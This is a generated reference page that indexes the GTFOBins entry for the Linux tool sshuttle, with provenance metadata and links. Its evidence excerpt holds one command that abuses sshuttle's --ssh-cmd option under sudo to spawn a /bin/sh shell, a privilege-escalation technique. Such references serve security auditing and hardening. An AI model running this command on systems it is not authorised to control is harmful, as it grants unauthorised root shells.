---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# sshuttle

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `sshuttle` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sshuttle` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for sshuttle covering shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/sshuttle.md)
- Source verification: [source record](../../sources/gtfobins/sshuttle.md)

## Aliases

- `sshuttle`

## Source Verification

[source record](../../sources/gtfobins/sshuttle.md)

## Evidence Excerpt

```text
_body: ''
_name: sshuttle
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sshuttle
functions:
shell:
- code: sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
contexts:
sudo: null
```
